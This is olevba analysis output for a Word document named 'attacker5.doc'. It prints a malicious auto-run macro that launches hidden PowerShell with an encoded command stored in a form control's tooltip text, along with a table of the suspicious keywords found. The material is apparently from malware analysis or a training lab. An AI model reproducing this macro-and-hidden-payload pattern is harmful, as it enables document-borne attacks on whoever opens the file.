pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: attacker5.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: attacker5.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: attacker5.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Shell "powershell -nop -w hidden -encodedcommand " & CatchMeIfYouCan.SquidGame.ControlTipText
End Sub
-------------------------------------------------------------------------------
VBA MACRO CatchMeIfYouCan.frm 
in file: attacker5.doc - OLE stream: 'Macros/VBA/CatchMeIfYouCan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub SquidGame_Click()

End Sub

Private Sub CatchMeIfYouCan_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'attacker5.doc' - OLE stream: 'Macros/CatchMeIfYouCan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1
-------------------------------------------------------------------------------
VBA FORM Variable "b'SquidGame'" IN 'attacker5.doc' - OLE stream: 'Macros/CatchMeIfYouCan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |SquidGame_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|encodedcommand      |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
